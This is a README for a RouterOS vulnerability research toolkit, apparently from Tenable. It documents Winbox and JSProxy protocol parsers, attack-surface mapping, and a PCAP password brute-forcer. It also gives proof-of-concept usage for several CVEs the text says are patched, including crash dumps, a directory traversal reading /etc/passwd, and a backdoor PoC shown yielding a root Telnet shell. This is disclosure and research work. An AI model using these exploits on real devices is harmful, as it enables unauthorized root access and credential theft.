# Bug Hunting in RouterOS

The tools in this repository were originally presented at Derbycon 2018. The tools were written to aid in (or were the result of) bug hunting in RouterOS. The main focus is the message protocol used on ports 80 and 8291.

## Building

Each project is seperated down into its own unit so you can't, currently, compile everything at once. Everything, except one project, is C++ and depends on Boost. All C++ projects in this repository use cmake for compilation. As such you should always be able to simply:

```sh
mkdir build
cd ./build/
cmake ..
make
```

## Test

This repository has a handful of tests to ensure the message protocol implementation is correct. While I can't guarentee I've nailed it 100%, I'm pretty happy with it overall.

### Usage

```sh
albinolobster@ubuntu:~/mikrotik$ cd tests/
albinolobster@ubuntu:~/mikrotik/tests$ mkdir build
albinolobster@ubuntu:~/mikrotik/tests$ cd build/
albinolobster@ubuntu:~/mikrotik/tests/build$ cmake ..
-- The C compiler identification is GNU 7.3.0
-- The CXX compiler identification is GNU 7.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Boost version: 1.65.1
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/mikrotik/tests/build
albinolobster@ubuntu:~/mikrotik/tests/build$ make
Scanning dependencies of target message_tests
[ 20%] Building CXX object CMakeFiles/message_tests.dir/src/winbox_parse_json_test.cpp.o
[ 40%] Building CXX object CMakeFiles/message_tests.dir/src/winbox_parse_test.cpp.o
[ 60%] Building CXX object CMakeFiles/message_tests.dir/src/winbox_serialize_json_test.cpp.o
[ 80%] Building CXX object CMakeFiles/message_tests.dir/home/albinolobster/mikrotik/common/winbox_message.cpp.o
[100%] Linking CXX executable message_tests
[100%] Built target message_tests
albinolobster@ubuntu:~/mikrotik/tests/build$ ./message_tests 
Running main() from gtest_main.cc
[==========] Running 34 tests from 3 test cases.
[----------] Global test environment set-up.
[----------] 10 tests from WinTestParseJSON
[ RUN      ] WinTestParseJSON.bool_test
[       OK ] WinTestParseJSON.bool_test (0 ms)
[ RUN      ] WinTestParseJSON.u32_test
[       OK ] WinTestParseJSON.u32_test (1 ms)
[ RUN      ] WinTestParseJSON.u64_test
[       OK ] WinTestParseJSON.u64_test (0 ms)
[ RUN      ] WinTestParseJSON.string_test
[       OK ] WinTestParseJSON.string_test (0 ms)
[ RUN      ] WinTestParseJSON.message_test
[       OK ] WinTestParseJSON.message_test (0 ms)
[ RUN      ] WinTestParseJSON.bool_array_test
[       OK ] WinTestParseJSON.bool_array_test (1 ms)
[ RUN      ] WinTestParseJSON.u32_array_test
[       OK ] WinTestParseJSON.u32_array_test (0 ms)
[ RUN      ] WinTestParseJSON.u64_array_test
[       OK ] WinTestParseJSON.u64_array_test (0 ms)
[ RUN      ] WinTestParseJSON.string_array_test
[       OK ] WinTestParseJSON.string_array_test (0 ms)
[ RUN      ] WinTestParseJSON.message_array_test
[       OK ] WinTestParseJSON.message_array_test (1 ms)
[----------] 10 tests from WinTestParseJSON (3 ms total)

[----------] 14 tests from WinTestParse
[ RUN      ] WinTestParse.bool_test
[       OK ] WinTestParse.bool_test (0 ms)
[ RUN      ] WinTestParse.u32_test
[       OK ] WinTestParse.u32_test (0 ms)
[ RUN      ] WinTestParse.u64_test
[       OK ] WinTestParse.u64_test (0 ms)
[ RUN      ] WinTestParse.ip6_test
[       OK ] WinTestParse.ip6_test (0 ms)
[ RUN      ] WinTestParse.string_test
[       OK ] WinTestParse.string_test (0 ms)
[ RUN      ] WinTestParse.message_test
[       OK ] WinTestParse.message_test (0 ms)
[ RUN      ] WinTestParse.raw_test
[       OK ] WinTestParse.raw_test (0 ms)
[ RUN      ] WinTestParse.bool_array_test
[       OK ] WinTestParse.bool_array_test (0 ms)
[ RUN      ] WinTestParse.u32_array_test
[       OK ] WinTestParse.u32_array_test (0 ms)
[ RUN      ] WinTestParse.u64_array_test
[       OK ] WinTestParse.u64_array_test (0 ms)
[ RUN      ] WinTestParse.ip6_array_test
[       OK ] WinTestParse.ip6_array_test (0 ms)
[ RUN      ] WinTestParse.string_array_test
[       OK ] WinTestParse.string_array_test (0 ms)
[ RUN      ] WinTestParse.message_array_test
[       OK ] WinTestParse.message_array_test (0 ms)
[ RUN      ] WinTestParse.raw_array_test
[       OK ] WinTestParse.raw_array_test (0 ms)
[----------] 14 tests from WinTestParse (0 ms total)

[----------] 10 tests from WinTestSerializeJSON
[ RUN      ] WinTestSerializeJSON.bool_test
[       OK ] WinTestSerializeJSON.bool_test (0 ms)
[ RUN      ] WinTestSerializeJSON.u32_test
[       OK ] WinTestSerializeJSON.u32_test (0 ms)
[ RUN      ] WinTestSerializeJSON.u64_test
[       OK ] WinTestSerializeJSON.u64_test (0 ms)
[ RUN      ] WinTestSerializeJSON.string_test
[       OK ] WinTestSerializeJSON.string_test (0 ms)
[ RUN      ] WinTestSerializeJSON.message_test
[       OK ] WinTestSerializeJSON.message_test (0 ms)
[ RUN      ] WinTestSerializeJSON.bool_array_test
[       OK ] WinTestSerializeJSON.bool_array_test (0 ms)
[ RUN      ] WinTestSerializeJSON.u32_array_test
[       OK ] WinTestSerializeJSON.u32_array_test (0 ms)
[ RUN      ] WinTestSerializeJSON.u64_array_test
[       OK ] WinTestSerializeJSON.u64_array_test (0 ms)
[ RUN      ] WinTestSerializeJSON.string_array_test
[       OK ] WinTestSerializeJSON.string_array_test (0 ms)
[ RUN      ] WinTestSerializeJSON.message_array_test
[       OK ] WinTestSerializeJSON.message_array_test (0 ms)
[----------] 10 tests from WinTestSerializeJSON (0 ms total)

[----------] Global test environment tear-down
[==========] 34 tests from 3 test cases ran. (3 ms total)
[  PASSED  ] 34 tests.
albinolobster@ubuntu:~/mikrotik/tests/build$ 

```

## Parse X3

The x3 parser parses the /nova/etc/loader/system.x3 file and spits out each binary's SYSTEM TO mapping.

### Usage

```sh
./x3_parse -f ../example/system_6_43_45.x3 
/nova/bin/log -> 3
/nova/bin/radius -> 5
/nova/bin/moduler -> 6
/nova/bin/user -> 13
...
```

## Find Handlers

The find handlers script is a Binary Ninja scripts that seaches a directory of binaries (/nova/bin ideally) for addHandler calls. It then spits out the handler numbers for each binary. This helps us figure out the attack surface for a given binary.

### Usage

```sh
albinolobster$  python find_handlers.py ~/Desktop/6_41_4/nova/bin/ 2> /dev/null
arpd,1
bridge2,0xa,1,5,2,6,3,0xb,0xc,0xd,7,8,9,100
btest,1
cerm,8,13,12,10,4,3,2,7,1,5,6,11
cerm-worker,8,13,12,10,4,3,2,7,1,5,6,11
console,2,4,5,8,0x66,101,3,6
detnet,1,2,0x64,0x65,0x66,0x67,0x68
diskd,1,2
email,99
fileman,1,2,3,4
graphing,0xa,2,3,5,7,1,4,6,8,9,0xc,0xd
ippool,1,2
kidcontrol,1,2
lcdstat,3,1,4,2
led,3,1,2
log,4,5,0,1,2,3
mactel,2,1
modprobed,1
moduler,1
mproxy,2,1
mproxy.bndb,2,1
net,0xd,0xe,0x24,0xa,0,0x5a,0x5b,0x32,0x31,1,8,0x25,0x39,0x3a,0x3e,0x3f,0x33,0x34,0x35,0x36,0x37,0x3d,0x55,0x5c,0x22,0x23,0x2f,0x30,0x2d,2,0x29,3,0x2a,6,0x2b,0x27,7,0x2c,4,5,0x56,0x57,0x58,0x59,0x1e,0x28,0x1f,0x1c,0x1d,0x11,0x21,0x20,0x3b,0x3c,0x26,0xc,9,0x4a,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54
portman,1
quickset,0x65,0x66
radius,1,2,3
rbbios,3,1,2
resolver,1,2,3,4
romon,2,1,3,4
sermgr,1
sertcp,1
smb,2,3,1
sniffer,1,2,3,4,6,5,0x64
snmp,4,5,1,2
socks,4,3,5
sys2,0x19,0,7,1,2,12,14,15,16,23,24,8,10,5,9,6
tftpd,1
trafficgen,1,8,2,6,9,0x64,0x65,0x66,3,4,5,7
trafflow,1,2
upnp,0,0x64,0x65
user,3,2,1,4,5,6,7,8
vrrp,1,0x64,0x65
watchdog,1
wproxy,1,2,3,6,4,5,8
www,1,2
```

## Get Policies

This program interrogates all of the RouterOS handlers to find out what commands the support and what policy is associated with that commands. The program requires the input of two csv:

* one from parse_x3 that tells the program all the system to mappings
* one from handler_csv that tells the program all the system's registered handlers

The result is that we can find the entire attack surface of RouterOS (via the message protocol) and the authentication required to touch all endpoints.

### Usage Example

```sh
albinolobster@ubuntu:~/mikrotik/get_policies/build$ ./get_policies -i 192.168.1.103 -p 8291 -d ../samples/handlers.csv -x ../samples/x3.csv 
[+] Found 66 x3 entries
[+] Found 41 handler entries
[+] 64 top level entries in the routing map
[+] /nova/bin/agent
    68
        1 : 20200 (0)
        2 : 20200 (0)
        3 : 20200 (0)
        4 : 20200 (0)
        5 : 20200 (0)
        6 : 20200 (0)
        7 : 20200 (0)
        fe0000 : 40 (0)
        fe0001 : 40 (0)
        fe0002 : 40 (0)
        fe0003 : 80 (0)
        fe0004 : 40 (0)
        fe0005 : 80 (0)
        fe0006 : 80 (0)
        fe0007 : 80 (0)
        fe0008 : 80 (0)
        fe000b : 80000000 (0)
        fe000d : 40 (0)
        fe000e : 80 (0)
        fe000f : 200 (0)
        fe0010 : 200 (0)
        fe0011 : 200 (0)
        fe0012 : 40 (0)
        fe0013 : 40 (0)
        fe0015 : 40 (0)
        fe0016 : 80 (0)
...
```

## JSProxy PCAP Parser

JSProxy PCAP Parser can parse a PCAP parser session out of a pcap, decrypts it, and spits it out as JSON on the command line.

### Usage

```sh
albinolobster@ubuntu:~/mikrotik/jsproxy_pcap_parser/build$ ./jsproxy_pcap_parser -u admin -p z3n -f ../samples/session_json_admin_z3n.pcap 
Opening ../samples/session_json_admin_z3n.pcap
[+] Found the initial request from c0a808cc:cf4c to c0a80168:50
[+] Found the session ID: 00000003
[+] Found the 16 byte challenge: b98c46896851552ffcf04999ef659ebd
[+] Generated the Master Key: a635e79de59837d2fb003814553f1441
[+] Generated the Server Key: 9081ac4ec53c8988f3ec60d2b9f0e5ed
[+] Generated the Client Key: 9976bbbcc87849d2397355de8cea9f3b
[+] Found the challenge response
 <- {Uff0001:[3],uff000b:65534,sfe0009:'default',sff000a:'admin'}
 -> {Uff0001:[120],uff0007:5}
 <- {Uff0001:[3],Uff0002:[120],uff0003:2,u1:32,uff0006:70}
 -> {}
 -> {Uff0001:[24,1],uff0007:16646162}
 -> {Uff0001:[24,1],uff0007:16646157,ufe000c:5}
 <- {Uff0001:[3],Uff0002:[24,1],uff0003:2,uff0006:71}
 <- {Uff0001:[3],Uff0002:[24,1],uff0003:2,uff0006:72,sc:'MikroTik',sd:'6.32.3'}
```

## JSProxy PCAP Password Bruteforce

Given a PCAP and a password list, this project will try to brute force the password of an observed web login.

### Usage

```sh
albinolobster@ubuntu:~/mikrotik/jsproxy_pcap_password_bruteforce/build$ ./jsproxy_pcap_password_bruteforce -f ../sample/login.pcap -p ../sample/passwords.txt 
[+] Loading passwords...
[+] Passwords loaded: 17
[+] Initial request found.
[+] Server challenge received.
[+] Challenge response found.
Username: admin
Password: z3n
Password Hash Hash: c3a6ab2e6b8e8e72efef3e6da4ff040c
Master Key: 6aef6aef777a0758cf0a200c6450bc90
```

## Winbox PCAP Parser

Parses an unencrypted Winbox session (port 8291), transforms it to JSON, and sends it to standard out. Note that Talos has a Wireshark dissector for this, and its probably worth checking out!

### Usage

```sh
albinolobster@ubuntu:~/mikrotik/winbox_pcap_parser/build$ ./winbox_pcap_decrypt -f ../samples/winbox_sample.pcap 
Opening ../samples/winbox_sample.pcap
-> {bff0005:1,uff0006:1,uff0007:7,s1:'list',Uff0001:[2,2],Uff0002:[0,11]}
<- {u2:1597,ufe0001:1,uff0003:2,uff0006:1,Uff0001:[0,11],Uff0002:[2,2]}
-> {ufe0001:1,uff0007:5,Uff0001:[2,2],Uff0002:[0,11]}
-> {bff0005:1,uff0006:2,uff0007:4,Uff0001:[13,4],Uff0002:[0,11]}
<- {uff0003:2,uff0006:2,r9:[67,121,228,252,17,174,130,78,212,114,141,91,170,69,36,132],Uff0001:[0,11],Uff0002:[13,4]}
-> {bc:0,bff0005:1,uff0006:3,uff0007:1,s1:'admin',r9:[67,121,228,252,17,174,130,78,212,114,141,91,170,69,36,132],ra:[0,101,92,77,105,140,208,148,16,225,166,54,54,145,53,184,229],Uff0001:[13,4],Uff0002:[0,11]}
<- {b13:0,ub:524286,uf:0,u10:0,ufe0001:1,uff0003:2,uff0006:3,s11:'i386',s15:'x86',s16:'3.11',s17:'x86',s18:'default',ra:[0,101,92,77,105,140,208,148,16,225,166,54,54,145,53,184,229],Uff0001:[0,11],Uff0002:[13,4]}
```

## Proof of Concepts

The following are proof of concepts for vulnerabilities found by Tenable. Excluding CVE-2018-14847 - that was found by someone else. I'd love to provide credit but I've never been able to determine who. By the way, all of these have been patched and only one of these gives the user a shell.

### CVE-2018-1156
The licupgr binary has a sprintf call that an authenticated user can use to trigger a remote stack buffer overflow. The sprintf is used on the following string:

```sh
GET /ssl_conn.php?usrname=%s&passwd=%s&softid=%s&level=%d&pay_type=%d&board=%d HTTP/1.0
```

Where the user has control of the username and password strings. Tenable's proof of concept results in the following crash dump:

```sh
2018.05.25-10:57:13.72@0: /nova/bin/licupgr
2018.05.25-10:57:13.72@0: --- signal=11 --------------------------------------------
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: eip=0x41414141 eflags=0x00010202
2018.05.25-10:57:13.72@0: edi=0x41414141 esi=0x41414141 ebp=0x41414141 esp=0x7fb052d0
2018.05.25-10:57:13.72@0: eax=0x7fb0532c ebx=0x41414141 ecx=0x00000899 edx=0x00000001
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: maps:
2018.05.25-10:57:13.72@0: 08048000-0804d000 r-xp 00000000 00:0b 1101       /nova/bin/licupgr
2018.05.25-10:57:13.72@0: 77547000-7757c000 r-xp 00000000 00:0b 997        /lib/libuClibc-0.9.33.2.so
2018.05.25-10:57:13.72@0: 77580000-7759a000 r-xp 00000000 00:0b 993        /lib/libgcc_s.so.1
2018.05.25-10:57:13.72@0: 7759b000-775aa000 r-xp 00000000 00:0b 977        /lib/libuc++.so
2018.05.25-10:57:13.72@0: 775ab000-775ad000 r-xp 00000000 00:0b 992        /lib/libdl-0.9.33.2.so
2018.05.25-10:57:13.72@0: 775af000-776f7000 r-xp 00000000 00:0b 987        /lib/libcrypto.so.1.0.0
2018.05.25-10:57:13.72@0: 77706000-7774a000 r-xp 00000000 00:0b 989        /lib/libssl.so.1.0.0
2018.05.25-10:57:13.72@0: 7774e000-77799000 r-xp 00000000 00:0b 979        /lib/libumsg.so
2018.05.25-10:57:13.72@0: 7779f000-777a6000 r-xp 00000000 00:0b 991        /lib/ld-uClibc-0.9.33.2.so
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: stack: 0x7fb06000 - 0x7fb052d0 
2018.05.25-10:57:13.72@0: 41 41 26 73 6f 66 74 69 64 3d 30 58 59 5a 2d 43 46 5a 52 26 6c 65 76 65 6c 3d 31 26 70 61 79 5f 
2018.05.25-10:57:13.72@0: 74 79 70 65 3d 31 26 62 6f 61 72 64 3d 31 20 48 54 54 50 2f 31 2e 30 0d 0a 41 63 63 65 70 74 3a 
2018.05.25-10:57:13.72@0: 
2018.05.25-10:57:13.72@0: code: 0x41414141
```

### CVE-2018-1157

An authenticated user can cause the www binary to consume all memory via a crafted POST request to /jsproxy/upload. When testing our proof of concept on an x86 RouterOS VM, Tenable discovered that this vulnerability didn't just crash www but caused the whole system to reboot.

### CVE-2018-1158

An authenticated user communicating with the www binary can trigger a stack exhaustion vulnerability via recursive parsing of JSON.

### CVE-2018-1159

An authenticated user can cause memory corruption in the www binary by rapidly authenticating and disconnecting. Tenable's proof of concept generates the following crash dump. Note that due to the nature of memory corruption this exact stack trace will be very difficult to reproduce:

```sh
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: /nova/bin/www
2018.05.25-11:11:54.39@0: --- signal=11 --------------------------------------------
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: eip=0x7755a130 eflags=0x00010212
2018.05.25-11:11:54.39@0: edi=0x746e6f43 esi=0x0000007b ebp=0x77588078 esp=0x7758806b
2018.05.25-11:11:54.39@0: eax=0x08063564 ebx=0x7755bbe8 ecx=0x08062a30 edx=0x08062a34
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: maps:
2018.05.25-11:11:54.39@0: 08048000-0805c000 r-xp 00000000 00:0b 1111       /nova/bin/www
2018.05.25-11:11:54.39@0: 77557000-7755b000 r-xp 00000000 00:0b 980        /lib/libucrypto.so
2018.05.25-11:11:54.39@0: 7755c000-77566000 r-xp 00000000 00:0b 1014       /nova/lib/www/jsproxy.p
2018.05.25-11:11:54.39@0: 77589000-775be000 r-xp 00000000 00:0b 997        /lib/libuClibc-0.9.33.2.so
2018.05.25-11:11:54.39@0: 775c2000-775dc000 r-xp 00000000 00:0b 993        /lib/libgcc_s.so.1
2018.05.25-11:11:54.39@0: 775dd000-775ec000 r-xp 00000000 00:0b 977        /lib/libuc++.so
2018.05.25-11:11:54.39@0: 775ed000-77735000 r-xp 00000000 00:0b 987        /lib/libcrypto.so.1.0.0
2018.05.25-11:11:54.39@0: 77744000-77788000 r-xp 00000000 00:0b 989        /lib/libssl.so.1.0.0
2018.05.25-11:11:54.39@0: 7778c000-7779b000 r-xp 00000000 00:0b 995        /lib/libpthread-0.9.33.2.so
2018.05.25-11:11:54.39@0: 7779f000-777a1000 r-xp 00000000 00:0b 992        /lib/libdl-0.9.33.2.so
2018.05.25-11:11:54.39@0: 777a3000-777a6000 r-xp 00000000 00:0b 981        /lib/libuxml++.so
2018.05.25-11:11:54.39@0: 777a7000-777f2000 r-xp 00000000 00:0b 979        /lib/libumsg.so
2018.05.25-11:11:54.39@0: 777f8000-777ff000 r-xp 00000000 00:0b 991        /lib/ld-uClibc-0.9.33.2.so
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: stack: 0x7ff2d000 - 0x7758806b 
2018.05.25-11:11:54.39@0: 77 43 6f 6e 74 7b 00 00 00 00 00 00 00 a8 80 58 77 3f a2 55 77 64 35 06 08 0c 36 06 08 26 00 00 
2018.05.25-11:11:54.39@0: 00 20 a2 55 77 f0 80 58 77 ec c4 5e 77 b8 80 58 77 58 62 56 77 64 35 06 08 e8 80 58 77 c8 80 58 
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: code: 0x7755a130
2018.05.25-11:11:54.39@0: 8a 14 38 88 55 f3 0f b6 fa 8b b0 04 01 00 00 01 
2018.05.25-11:11:54.39@0: 
2018.05.25-11:11:54.39@0: backtrace: 0x7755a130 0x7755a23f 0x77562821 0x77564ef1 0x77565369 0x7756122b 0
```

### CVE-2018-14847

This PoC reads /etc/passwd on the remote system via directory traversal over Winbox (8291)


#### Usage

```sh
albinolobster@ubuntu:~/mikrotik/poc/cve_2018_14847/build$ ./cve_2018_14847_poc -i 192.168.8.189 -p 8291

=== File Contents (size: 69) ===
nobody:*:99:99:nobody:/tmp:/bin/sh
root::0:0:root:/home/root:/bin/sh
```

### By the Way

This PoC creates the system backdoor file that enables root Telnet. It essentially allows a remote attacker with no knowledge of the admin password to root the device. Note that this partially leverages CVE-2018-14847 and was therefore patched in April, 2018.


#### Usage

```sh
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ ./btw -i 192.168.8.189

   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬
   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘
   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴ 

[+] Extracting passwords from 192.168.8.189:8291
[+] Searching for administrator credentials 
[-] Failed to find admin creds. Trying default.
[+] Using credentials - admin:
[+] Creating /pckg/option on 192.168.8.189:8291
[+] Creating /flash/nova/etc/devel-login on 192.168.8.189:8291
[+] There's a light on
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.8.189
Trying 192.168.8.189...
Connected to 192.168.8.189.
Escape character is '^]'.
Password: 


BusyBox v1.00 (2018.02.20-13:23+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# uname -a
Linux MikroTik 3.3.5-smp #1 SMP Tue Feb 20 13:10:19 UTC 2018 i686 unknown
# cat /rw/logs/VERSION 
v6.41.3 Mar/08/2018 11:55:40
# 
```
